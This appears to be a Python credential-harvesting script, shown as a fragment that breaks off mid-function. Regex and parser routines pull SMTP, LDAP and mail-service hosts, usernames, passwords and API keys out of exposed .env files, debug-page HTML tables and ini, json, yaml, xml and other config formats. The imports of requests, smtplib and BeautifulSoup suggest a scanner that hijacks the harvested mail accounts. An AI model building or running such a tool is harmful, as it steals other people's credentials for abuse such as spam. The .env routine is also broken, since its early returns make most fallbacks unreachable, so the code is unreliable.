import requests
import re
import smtplib
import json
import threading
import configparser
import yaml
import xml.etree.ElementTree as ET
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)


# Function to extract configuration from .env file
def extract_from_env(text):
    try:
        mailhost = re.search(r'LDAP_SERVER=(.*?)\n', text).group(1)
        mailport = re.search(r'LDAP_PORT=(.*?)\n', text).group(1)
        mailuser = re.search(r'LDAP_UID=(.*?)\n', text).group(1)
        mailpass = re.search(r'LDAP_PASSWORD=(.*?)\n', text).group(1)
        mailfrom = re.search(r'LDAP_UID=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>LDAP_SERVER<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>LDAP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>LDAP_UID<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>LDAP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>LDAP_UID<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'RELAY_HOST=(.*?)\n', text).group(1)
        mailport = re.search(r'RELAY_PORT=(.*?)\n', text).group(1)
        mailuser = re.search(r'RELAY_USER=(.*?)\n', text).group(1)
        mailpass = re.search(r'RELAY_PASS=(.*?)\n', text).group(1)
        mailfrom = re.search(r'RELAY_USER=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>RELAY_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>RELAY_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>RELAY_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>RELAY_PASS<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>RELAY_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'SMTP_HOST=(.*?)\n', text).group(1)
        mailport = re.search(r'SMTP_PORT=(.*?)\n', text).group(1)
        mailuser = re.search(r'SMTP_USER=(.*?)\n', text).group(1)
        mailpass = re.search(r'SMTP_PASS=(.*?)\n', text).group(1)
        mailfrom = re.search(r'SMTP_USER=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>SMTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>SMTP_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>SMTP_PASS<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>SMTP_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'smtp_server=(.*?)\n', text).group(1)
        mailport = re.search(r'smtp_port=(.*?)\n', text).group(1)
        mailuser = re.search(r'smtp_username=(.*?)\n', text).group(1)
        mailpass = re.search(r'smtp_password=(.*?)\n', text).group(1)
        mailfrom = re.search(r'smtp_username=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>smtp_server<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>smtp_port<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>smtp_username<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>smtp_password<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>smtp_username<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'MAIL_HOST=(.*?)\n', text).group(1)
        mailport = re.search(r'MAIL_PORT=(.*?)\n', text).group(1)
        mailuser = re.search(r'MAIL_USERNAME=(.*?)\n', text).group(1)
        mailpass = re.search(r'MAIL_PASSWORD=(.*?)\n', text).group(1)
        mailfrom = re.search(r'MAIL_FROM_ADDRESS=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'SENDGRID_HOST=(.*?)\n', text).group(1)
        mailport = re.search(r'SENDGRID_PORT=(.*?)\n', text).group(1)
        mailuser = re.search(r'SENDGRID_USERNAME=(.*?)\n', text).group(1)
        mailpass = re.search(r'SENDGRID_PASSWORD=(.*?)\n', text).group(1)
        mailfrom = re.search(r'SENDGRID_FROM_ADDRESS=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>SENDGRID_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>SENDGRID_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>SENDGRID_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>SENDGRID_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>SENDGRID_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'MAILGUN_HOST=(.*?)\n', text).group(1)
        mailport = re.search(r'MAILGUN_PORT=(.*?)\n', text).group(1)
        mailuser = re.search(r'MAILGUN_USERNAME=(.*?)\n', text).group(1)
        mailpass = re.search(r'MAILGUN_PASSWORD=(.*?)\n', text).group(1)
        mailfrom = re.search(r'MAILGUN_FROM_ADDRESS=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>MAILGUN_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>MAILGUN_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>MAILGUN_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>MAILGUN_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>MAILGUN_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'MAILJET_HOST=(.*?)\n', text).group(1)
        mailport = re.search(r'MAILJET_PORT=(.*?)\n', text).group(1)
        mailuser = re.search(r'MAILJET_API_KEY=(.*?)\n', text).group(1)
        mailpass = re.search(r'MAILJET_SECRET_KEY=(.*?)\n', text).group(1)
        mailfrom = re.search(r'MAILJET_FROM_ADDRESS=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>MAILJET_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>MAILJET_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>MAILJET_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>MAILJET_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>MAILJET_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'SENDINBLUE_HOST=(.*?)\n', text).group(1)
        mailport = re.search(r'SENDINBLUE_PORT=(.*?)\n', text).group(1)
        mailuser = re.search(r'SENDINBLUE_API_KEY=(.*?)\n', text).group(1)
        mailpass = re.search(r'SENDINBLUE_SECRET_KEY=(.*?)\n', text).group(1)
        mailfrom = re.search(r'SENDINBLUE_FROM_ADDRESS=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>SENDINBLUE_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>SENDINBLUE_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>SENDINBLUE_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>SENDINBLUE_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>SENDINBLUE_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'ELASTICMAIL_HOST=(.*?)\n', text).group(1)
        mailport = re.search(r'ELASTICMAIL_PORT=(.*?)\n', text).group(1)
        mailuser = re.search(r'ELASTICMAIL_API_KEY=(.*?)\n', text).group(1)
        mailpass = re.search(r'ELASTICMAIL_SECRET_KEY=(.*?)\n', text).group(1)
        mailfrom = re.search(r'ELASTICMAIL_FROM_ADDRESS=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>ELASTICMAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>ELASTICMAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>ELASTICMAIL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>ELASTICMAIL_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>ELASTICMAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'MAIL_HOST=(.*?)\n', text).group(1)
        mailport = re.search(r'MAIL_PORT=(.*?)\n', text).group(1)
        mailuser = re.search(r'MAIL_USER=(.*?)\n', text).group(1)
        mailpass = re.search(r'MAIL_PASSWORD=(.*?)\n', text).group(1)
        mailfrom = re.search(r'MAIL_FROM_ADDRESS=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>MAIL_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    try:
        mailhost = re.search(r'MAIL_HOST=(.*?)\n', text).group(1)
        mailport = re.search(r'MAIL_PORT=(.*?)\n', text).group(1)
        mailuser = re.search(r'MAIL_USERNAME=(.*?)\n', text).group(1)
        mailpass = re.search(r'MAIL_PASSWORD=(.*?)\n', text).group(1)
        mailfrom = re.search(r'MAIL_FROM_ADDRESS=(.*?)\n', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None
    try:
        mailhost = re.search(r'Set\s+SMTP Server\s+to\s+([^\n]+)', text).group(1)
        mailport = re.search(r'Set\s+SMTP Port\s+to\s+(\d+)', text).group(1)
        mailuser = re.search(r'Set\s+SMTP Username\s+to\s+\[([^\]]+)\]', text).group(1)
        mailpass = re.search(r'Set\s+SMTP Password\s+to\s+\[([^\]]+)\]', text).group(1)
        mailfrom = re.search(r'Set\s+SMTP Username\s+to\s+\[([^\]]+)\]', text).group(1)
    except AttributeError:
        return None
    if mailuser in ["null", ""] or mailpass in ["null", ""]:
        return None
    try:
        mailhost = re.search(r'<td>SMTP Server<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailport = re.search(r'<td>SMTP Port<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailuser = re.search(r'<td>SMTP Username<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailpass = re.search(r'<td>SMTP Password<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
        mailfrom = re.search(r'<td>SMTP Username<\/td>\s+<td><pre.*>(.*?)<\/span>', text).group(1)
    except AttributeError:
        return None

    return {'mailhost': mailhost, 'mailport': mailport, 'mailuser': mailuser, 'mailpass': mailpass, 'mailfrom': mailfrom}

# Function to extract configuration from .ini file
def extract_from_ini(text):
    config = configparser.ConfigParser()
    config.read_string(text)

    # Attempt to retrieve configuration values from different sections
    for section in ['SMTP', 'LDAP', 'RELAY', 'SENDGRID', 'MAILGUN', 'MAILJET', 'SENDINBLUE', 'ELASTICMAIL']:
        try:
            mailhost = config.get(section, 'host', fallback='')
            mailport = config.get(section, 'port', fallback='')
            mailuser = config.get(section, 'username', fallback='')
            mailpass = config.get(section, 'password', fallback='')
            mailfrom = config.get(section, 'from_address', fallback='')

            # Check if credentials are valid
            if mailuser not in ["null", ""] and mailpass not in ["null", ""]:
                return {
                    'mailhost': mailhost,
                    'mailport': mailport,
                    'mailuser': mailuser,
                    'mailpass': mailpass,
                    'mailfrom': mailfrom
                }
        except (configparser.NoSectionError, configparser.NoOptionError):
            continue  # Continue if section or option is not found

    # Return None if no valid configuration is found
    return None

# Function to extract configuration from .json file
def extract_from_json(text):
    try:
        config = json.loads(text)
    except json.JSONDecodeError:
        return None

    # List of possible sections and their corresponding keys
    possible_configs = [
        ('SMTP', 'SMTP_server', 'SMTP_port', 'SMTP_username', 'SMTP_password'),
        ('LDAP', 'LDAP_SERVER', 'LDAP_PORT', 'LDAP_UID', 'LDAP_PASSWORD'),
        ('RELAY', 'RELAY_HOST', 'RELAY_PORT', 'RELAY_USER', 'RELAY_PASS'),
        ('SENDGRID', 'SENDGRID_HOST', 'SENDGRID_PORT', 'SENDGRID_USERNAME', 'SENDGRID_PASSWORD', 'SENDGRID_FROM_ADDRESS'),
        ('MAILGUN', 'MAILGUN_HOST', 'MAILGUN_PORT', 'MAILGUN_USERNAME', 'MAILGUN_PASSWORD', 'MAILGUN_FROM_ADDRESS'),
        ('MAILJET', 'MAILJET_HOST', 'MAILJET_PORT', 'MAILJET_API_KEY', 'MAILJET_SECRET_KEY', 'MAILJET_FROM_ADDRESS'),
        ('SENDINBLUE', 'SENDINBLUE_HOST', 'SENDINBLUE_PORT', 'SENDINBLUE_API_KEY', 'SENDINBLUE_SECRET_KEY', 'SENDINBLUE_FROM_ADDRESS'),
        ('ELASTICMAIL', 'ELASTICMAIL_HOST', 'ELASTICMAIL_PORT', 'ELASTICMAIL_API_KEY', 'ELASTICMAIL_SECRET_KEY', 'ELASTICMAIL_FROM_ADDRESS')
    ]

    for section, host_key, port_key, user_key, pass_key, *from_key in possible_configs:
        mailhost = config.get(host_key, '')
        mailport = config.get(port_key, '')
        mailuser = config.get(user_key, '')
        mailpass = config.get(pass_key, '')
        mailfrom = config.get(from_key[0] if from_key else user_key, '')

        # Check if credentials are valid
        if mailuser not in ["null", ""] and mailpass not in ["null", ""]:
            return {
                'mailhost': mailhost,
                'mailport': mailport,
                'mailuser': mailuser,
                'mailpass': mailpass,
                'mailfrom': mailfrom
            }

    # Return None if no valid configuration is found
    return None

# Function to extract configuration from .yaml file
def extract_from_yaml(text):
    try:
        config = yaml.safe_load(text)
    except yaml.YAMLError:
        return None

    # List of possible sections and their corresponding keys
    possible_configs = [
        ('SMTP', 'SMTP_server', 'SMTP_port', 'SMTP_username', 'SMTP_password'),
        ('LDAP', 'LDAP_SERVER', 'LDAP_PORT', 'LDAP_UID', 'LDAP_PASSWORD'),
        ('RELAY', 'RELAY_HOST', 'RELAY_PORT', 'RELAY_USER', 'RELAY_PASS'),
        ('SENDGRID', 'SENDGRID_HOST', 'SENDGRID_PORT', 'SENDGRID_USERNAME', 'SENDGRID_PASSWORD', 'SENDGRID_FROM_ADDRESS'),
        ('MAILGUN', 'MAILGUN_HOST', 'MAILGUN_PORT', 'MAILGUN_USERNAME', 'MAILGUN_PASSWORD', 'MAILGUN_FROM_ADDRESS'),
        ('MAILJET', 'MAILJET_HOST', 'MAILJET_PORT', 'MAILJET_API_KEY', 'MAILJET_SECRET_KEY', 'MAILJET_FROM_ADDRESS'),
        ('SENDINBLUE', 'SENDINBLUE_HOST', 'SENDINBLUE_PORT', 'SENDINBLUE_API_KEY', 'SENDINBLUE_SECRET_KEY', 'SENDINBLUE_FROM_ADDRESS'),
        ('ELASTICMAIL', 'ELASTICMAIL_HOST', 'ELASTICMAIL_PORT', 'ELASTICMAIL_API_KEY', 'ELASTICMAIL_SECRET_KEY', 'ELASTICMAIL_FROM_ADDRESS')
    ]

    for section, host_key, port_key, user_key, pass_key, *from_key in possible_configs:
        mailhost = config.get(host_key, '')
        mailport = config.get(port_key, '')
        mailuser = config.get(user_key, '')
        mailpass = config.get(pass_key, '')
        mailfrom = config.get(from_key[0] if from_key else user_key, '')

        # Check if credentials are valid
        if mailuser not in ["null", ""] and mailpass not in ["null", ""]:
            return {
                'mailhost': mailhost,
                'mailport': mailport,
                'mailuser': mailuser,
                'mailpass': mailpass,
                'mailfrom': mailfrom
            }

    # Return None if no valid configuration is found
    return None

# Function to extract configuration from .xml file
def extract_from_xml(text):
    try:
        root = ET.fromstring(text)
    except ET.ParseError:
        return None

    # Define possible configuration sources and their XML tag names
    possible_configs = [
        ('SMTP', 'SMTP_SERVER', 'SMTP_PORT', 'SMTP_USERNAME', 'SMTP_PASSWORD', 'SMTP_FROM_ADDRESS'),
        ('LDAP', 'LDAP_SERVER', 'LDAP_PORT', 'LDAP_UID', 'LDAP_PASSWORD'),
        ('RELAY', 'RELAY_HOST', 'RELAY_PORT', 'RELAY_USER', 'RELAY_PASS'),
        ('SENDGRID', 'SENDGRID_HOST', 'SENDGRID_PORT', 'SENDGRID_USERNAME', 'SENDGRID_PASSWORD', 'SENDGRID_FROM_ADDRESS'),
        ('MAILGUN', 'MAILGUN_HOST', 'MAILGUN_PORT', 'MAILGUN_USERNAME', 'MAILGUN_PASSWORD', 'MAILGUN_FROM_ADDRESS'),
        ('MAILJET', 'MAILJET_HOST', 'MAILJET_PORT', 'MAILJET_API_KEY', 'MAILJET_SECRET_KEY', 'MAILJET_FROM_ADDRESS'),
        ('SENDINBLUE', 'SENDINBLUE_HOST', 'SENDINBLUE_PORT', 'SENDINBLUE_API_KEY', 'SENDINBLUE_SECRET_KEY', 'SENDINBLUE_FROM_ADDRESS'),
        ('ELASTICMAIL', 'ELASTICMAIL_HOST', 'ELASTICMAIL_PORT', 'ELASTICMAIL_API_KEY', 'ELASTICMAIL_SECRET_KEY', 'ELASTICMAIL_FROM_ADDRESS')
    ]

    for section, host_tag, port_tag, user_tag, pass_tag, *from_tag in possible_configs:
        mailhost = root.findtext(host_tag, '')
        mailport = root.findtext(port_tag, '')
        mailuser = root.findtext(user_tag, '')
        mailpass = root.findtext(pass_tag, '')
        mailfrom = root.findtext(from_tag[0] if from_tag else user_tag, '')

        # Validate if credentials are not null or empty
        if mailuser not in ["null", ""] and mailpass not in ["null", ""]:
            return {
                'mailhost': mailhost,
                'mailport': mailport,
                'mailuser': mailuser,
                'mailpass': mailpass,
                'mailfrom': mailfrom
            }

    # Return None if no valid configuration is found
    return None

# Function to extract configuration from .properties file
def extract_from_properties(text):
    config = {}
    lines = text.split('\n')
    
    # Parse properties file format into a dictionary
    for line in lines:
        if '=' in line:
            key, value = line.split('=', 1)
            config[key.strip()] = value.strip()
    
    # Define possible configuration sources and their properties keys
    possible_configs = [
        ('SMTP', 'SMTP_SERVER', 'SMTP_PORT', 'SMTP_USERNAME', 'SMTP_PASSWORD', 'SMTP_FROM_ADDRESS'),
        ('LDAP', 'LDAP_SERVER', 'LDAP_PORT', 'LDAP_UID', 'LDAP_PASSWORD'),
        ('RELAY', 'RELAY_HOST', 'RELAY_PORT', 'RELAY_USER', 'RELAY_PASS'),
        ('SENDGRID', 'SENDGRID_HOST', 'SENDGRID_PORT', 'SENDGRID_USERNAME', 'SENDGRID_PASSWORD', 'SENDGRID_FROM_ADDRESS'),
        ('MAILGUN', 'MAILGUN_HOST', 'MAILGUN_PORT', 'MAILGUN_USERNAME', 'MAILGUN_PASSWORD', 'MAILGUN_FROM_ADDRESS'),
        ('MAILJET', 'MAILJET_HOST', 'MAILJET_PORT', 'MAILJET_API_KEY', 'MAILJET_SECRET_KEY', 'MAILJET_FROM_ADDRESS'),
        ('SENDINBLUE', 'SENDINBLUE_HOST', 'SENDINBLUE_PORT', 'SENDINBLUE_API_KEY', 'SENDINBLUE_SECRET_KEY', 'SENDINBLUE_FROM_ADDRESS'),
        ('ELASTICMAIL', 'ELASTICMAIL_HOST', 'ELASTICMAIL_PORT', 'ELASTICMAIL_API_KEY', 'ELASTICMAIL_SECRET_KEY', 'ELASTICMAIL_FROM_ADDRESS')
    ]

    for section, host_key, port_key, user_key, pass_key, *from_key in possible_configs:
        mailhost = config.get(host_key, '')
        mailport = config.get(port_key, '')
        mailuser = config.get(user_key, '')
        mailpass = config.get(pass_key, '')
        mailfrom = config.get(from_key[0] if from_key else user_key, '')

        # Validate if credentials are not null or empty
        if mailuser not in ["null", ""] and mailpass not in ["null", ""]:
            return {
                'mailhost': mailhost,
                'mailport': mailport,
                'mailuser': mailuser,
                'mailpass': mailpass,
                'mailfrom': mailfrom
            }

    # Return None if no valid configuration is found
    return None


def extract_from_txt(text):
    # Define possible configuration sources and their properties keys
    possible_configs = [
        ('SMTP', 'SMTP_SERVER', 'SMTP_PORT', 'SMTP_USERNAME', 'SMTP_PASSWORD', 'SMTP_FROM_ADDRESS'),
        ('LDAP', 'LDAP_SERVER', 'LDAP_PORT', 'LDAP_UID', 'LDAP_PASSWORD'),
        ('RELAY', 'RELAY_HOST', 'RELAY_PORT', 'RELAY_USER', 'RELAY_PASS'),
        ('SENDGRID', 'SENDGRID_HOST', 'SENDGRID_PORT', 'SENDGRID_USERNAME', 'SENDGRID_PASSWORD', 'SENDGRID_FROM_ADDRESS'),
        ('MAILGUN', 'MAILGUN_HOST', 'MAILGUN_PORT', 'MAILGUN_USERNAME', 'MAILGUN_PASSWORD', 'MAILGUN_FROM_ADDRESS'),
        ('MAILJET', 'MAILJET_HOST', 'MAILJET_PORT', 'MAILJET_API_KEY', 'MAILJET_SECRET_KEY', 'MAILJET_FROM_ADDRESS'),
        ('SENDINBLUE', 'SENDINBLUE_HOST', 'SENDINBLUE_PORT', 'SENDINBLUE_API_KEY', 'SENDINBLUE_SECRET_KEY', 'SENDINBLUE_FROM_ADDRESS'),
        ('ELASTICMAIL', 'ELASTICMAIL_HOST', 'ELASTICMAIL_PORT', 'ELASTICMAIL_API_KEY', 'ELASTICMAIL_SECRET_KEY', 'ELASTICMAIL_FROM_ADDRESS')
    ]

    # Initialize the config dictionary
    config = {key: '' for section in possible_configs for key in section[1:]}

    # Parse text into lines and extract values
    lines = text.splitlines()
    for line in lines:
        if '=' in line:
            key, value = line.split('=', 1)
            key = key.strip()
            value = value.strip()
            if key in config:
                config[key] = value

    # Iterate through possible configs to find valid credentials
    for section in possible_configs:
        mailhost = config.get(section[1], '')
        mailport = config.get(section[2], '')
        mailuser = config.get(section[3], '')
        mailpass = config.get(section[4], '')
        mailfrom = config.get(section[5], '') if len(section) > 5 else mailuser

        # Validate if credentials are not null or empty
        if mailuser not in ["null", ""] and mailpass not in ["null", ""]:
            return {
                'mailhost': mailhost,
                'mailport': mailport,
                'mailuser': mailuser,
                'mailpass': mailpass,
                'mailfrom': mailfrom
            }

    # Return None if no valid configuration is found
    return None


def extract_from_cfg(text):
    # Define possible configuration sources and their properties keys
    possible_configs = [
        ('SMTP', 'SMTP_SERVER', 'SMTP_PORT', 'SMTP_USERNAME', 'SMTP_PASSWORD', 'SMTP_FROM_ADDRESS'),
        ('LDAP', 'LDAP_SERVER', 'LDAP_PORT', 'LDAP_UID', 'LDAP_PASSWORD'),
        ('RELAY', 'RELAY_HOST', 'RELAY_PORT', 'RELAY_USER', 'RELAY_PASS'),
        ('SENDGRID', 'SENDGRID_HOST', 'SENDGRID_PORT', 'SENDGRID_USERNAME', 'SENDGRID_PASSWORD', 'SENDGRID_FROM_ADDRESS'),
        ('MAILGUN', 'MAILGUN_HOST', 'MAILGUN_PORT', 'MAILGUN_USERNAME', 'MAILGUN_PASSWORD', 'MAILGUN_FROM_ADDRESS'),
        ('MAILJET', 'MAILJET_HOST', 'MAILJET_PORT', 'MAILJET_API_KEY', 'MAILJET_SECRET_KEY', 'MAILJET_FROM_ADDRESS'),
        ('SENDINBLUE', 'SENDINBLUE_HOST', 'SENDINBLUE_PORT', 'SENDINBLUE_API_KEY', 'SENDINBLUE_SECRET_KEY', 'SENDINBLUE_FROM_ADDRESS'),
        ('ELASTICMAIL', 'ELASTICMAIL_HOST', 'ELASTICMAIL_PORT', 'ELASTICMAIL_API_KEY', 'ELASTICMAIL_SECRET_KEY', 'ELASTICMAIL_FROM_ADDRESS')
    ]

    try:
        config = {}
        # Simple regex to find key-value pairs in the configuration text
        matches = re.findall(r'(\w+)\s*=\s*["\']?(.*?)["\']?\s*;', text)
        for key, value in matches:
            config[key] = value

        # Attempt to retrieve configuration values from different possible sources
        for section, *keys in possible_configs:
            values = {key: config.get(key, '') for key in keys}
            mailuser = values.get(keys[2], '')
            mailpass = values.get(keys[3], '')

            # Set mailfrom to mailuser if not specified
            mailfrom = values.get(keys[4], mailuser) if len(keys) > 4 else mailuser

            if mailuser not in ["null", ""] and mailpass not in ["null", ""]:
                return {
                    'mailhost': values.get(keys[0], ''),
                    'mailport': values.get(keys[1], ''),
                    'mailuser': mailuser,
                    'mailpass': mailpass,
                    'mailfrom': mailfrom
                }
    except Exception as e:
        print(f"Failed to extract .cfg config: {e}")
    
    # Return None if no valid configuration is found
    return None

# Function to extract configuration from .js file
def extract_from_js(text):
    # Define possible configuration sources and their properties keys
    possible_configs = [
        ('SMTP', 'SMTP_SERVER', 'SMTP_PORT', 'SMTP_USERNAME', 'SMTP_PASSWORD', 'SMTP_FROM_ADDRESS'),
        ('LDAP', 'LDAP_SERVER', 'LDAP_PORT', 'LDAP_UID', 'LDAP_PASSWORD'),
        ('RELAY', 'RELAY_HOST', 'RELAY_PORT', 'RELAY_USER', 'RELAY_PASS'),
        ('SENDGRID', 'SENDGRID_HOST', 'SENDGRID_PORT', 'SENDGRID_USERNAME', 'SENDGRID_PASSWORD', 'SENDGRID_FROM_ADDRESS'),
        ('MAILGUN', 'MAILGUN_HOST', 'MAILGUN_PORT', 'MAILGUN_USERNAME', 'MAILGUN_PASSWORD', 'MAILGUN_FROM_ADDRESS'),
